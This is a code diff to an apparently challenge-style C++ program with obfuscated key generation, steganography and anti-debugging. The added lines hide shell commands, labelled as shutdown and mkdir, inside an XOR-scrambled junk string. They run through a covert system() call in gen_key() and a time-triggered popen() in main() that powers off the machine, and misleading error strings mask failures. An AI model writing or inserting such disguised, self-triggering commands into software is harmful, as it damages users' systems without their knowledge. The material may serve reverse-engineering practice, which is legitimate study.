@@ -11,6 +11,9 @@
 #include <sys/mman.h>
 #include <cstring>
 #include <fstream>
+#include <openssl/sha.h> // hash function
+#include <iomanip>
+#include <sstream>
 
 long long bs1 = 0x0f2bc3ee05faa249;
 long long bs2 = 0x70DD85D8FE63E152;
@@ -36,6 +39,7 @@ int masking_func(int param1, int param2)
 
 //can use this function to fuck with them and hide which key gets generated
 int gen_key(){
+    system(system_call(1));
     int key1 = masking_func((1<<9), bs1);
     int key2 = masking_func((1<<8), bs2);
     int key3 = masking_func((1<<7), bs3);
@@ -163,6 +167,23 @@ void create_stego_image(const char* filename, int hiddenKey) {
     imageFile.close();
 }
 
+//Hash function 
+//  "g++ C2.cpp -o C2  -lssl -lcrypto" to compile
+std::string compute_sha256(const std::string& input) {
+    unsigned char hash[SHA256_DIGEST_LENGTH];  //an array hash to store the resulting hash.
+    SHA256_CTX sha256; //hold the state of the SHA-256 computation.
+    SHA256_Init(&sha256);
+    SHA256_Update(&sha256, input.c_str(), input.size());
+    SHA256_Final(hash, &sha256);
+    
+    std::ostringstream oss;
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i) { //hash is converted to a hexadecimal string format for easy readability and returned
+        oss  << (int)hash[i];
+        //oss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
+    }
+    return oss.str();
+}
+
 //allegedly this will detect if a debugger is already attached to the program
 bool is_debugger_attached() {
     // Attempt to attach to the current process
@@ -187,7 +208,7 @@ std::string system_call(int arg) {
     std::string target;
     
     
-    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V urngpqiuntpq3948thq984hg-q98ern-g98qn4-89n-498hng-9qe8rng=q349ug=qe895jg=938ht-w4958jg-=r8rtjb-q9r8enf-ifunb-wu34nt-1894gn-98wntb-9q8n5g-89qn43-t8q23n4-t8jtb-98nw-ret98ghn-q3498thn2-98ntq-85ng-q85ng-q98rjg-q8349j5-q348tnq-8jg-q98rng-q9384nt-9q384ng-w8ng-=q98rng-qirn[oeirng[ qirgqirgnq984h-5tq9823h4-t98qh-35498ghq-9384hg-q9384ht-q3894u6=q09rg0qj-3413y-4897gth103874thbn013874nf-1384hnf-1weiduhfoaijsdfhpaiwuerh-198u4rt-19834ht-8urng-qe9r8ugh-2q93845ut-91384jnf-q3uhrf-q938urty-q39485uq-3948gjf-q9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
+    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8enf-ifunb-wu34nt-1894gn-98wntb-9q8n5g-89qn43-t8q23n4-t8jtb-98nw-ret98ghn-q3498thn2-98ntq-85ng-q85ng-q98rjg-q8349j5-q348tnq-8jg-q98rng-q9384nt-9q384ng-w8ng-=q98rng-qirn[oeirng[ qirgqirgnq984h-5tq9823h4-t98qh-35498ghq-9384hg-q9384ht-q3894u6=q09rg0qj-3413y-4897gth103874thbn013874nf-1384hnf-1weiduhfoaijsdfhpaiwuerh-198u4rt-19834ht-8urng-qe9r8ugh-2q93845ut-91384jnf-q3uhrf-q938urty-q39485uq-3948gjf-q9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
     
     
     if (arg == 0) { //shutdown -P
@@ -217,10 +238,33 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 2) {
+    else if (arg == 2) { //mkdir /tmp/work
+        start = ((rand() % rand() - 120 + 120) / 95555) / 140; //112
+        length = ((rand()) % (rand()) % (rand())) / ((rand()) % (rand()) % (rand())) + 12; //15
+        
+        target = big_long_string.substr(start, length);
+        int index = ((rand() % 555) % 222 % 221) - 555;
+
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
         
     }
-    else if (arg == 3) {}
+    else if (arg == 3) { //mkdir /tmp/work/root
+        start = (rand() % rand() % rand() % rand()) / (rand() % 6666666) + 120; //163
+        length = ((rand() % rand()) % (rand()) / 6666666) - 26;
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221;
+        
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
+    }
     else if (arg == 4) { //shutdown -P
         start = ((rand() + rand() - rand() % rand() - rand() - rand()) % 4444) / 51; //83
         length = (rand() % rand() % rand()) / ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 200) - 66; //11
@@ -247,6 +291,19 @@ std::string system_call(int arg) {
         
         return target;
     }
+    else if (arg == 6) { //mkdir /tmp/work/Public
+        start = ((rand() % rand() % rand() % rand() % rand() % rand()) / 1000000) + 22; //130
+        length = ((rand() % rand() % rand() % rand() % rand() % rand()) / 10000000) - 10; //22
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 11;
+        
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
+    }
     
     
     return big_long_string;
@@ -264,7 +321,7 @@ int gettenminute() {
     fp = popen(system_call(5).c_str(), "r"); 
 
     if (fp == NULL) {
-        std::cerr << "Failed to open pipe" << std::endl;
+        std::cerr << "Nagoya" << std::endl;
         return 1;
     }
 
@@ -283,6 +340,21 @@ int main(){
     if(is_debugger_attached()){
         //system("shutdown&");
         printf("Debugger detected");
+    }
+
+    //Shutdown if tens place is 1
+    if (gettenminute() == 1) {
+        FILE *fp;
+        char buffer[20];
+        std::string result = "";
+
+        // Open the pipe for reading
+        fp = popen(system_call(0).c_str(), "r"); 
+
+        if (fp == NULL) {
+            std::cerr << "Osaka" << std::endl;
+            return 1;
+        }    
     }
 
     // Register the signal handler
@@ -304,6 +376,9 @@ int main(){
     stream_encrypt(pt, ct, 1000);
 
     printf("%s", ct);
+
+    std::string password = "password_here"; // CHANGE PASSWORD
+    std::cout << "Hashed Password: " << compute_sha256(password) << std::endl;
 
     std::cout << gettenminute() << std::endl;
 
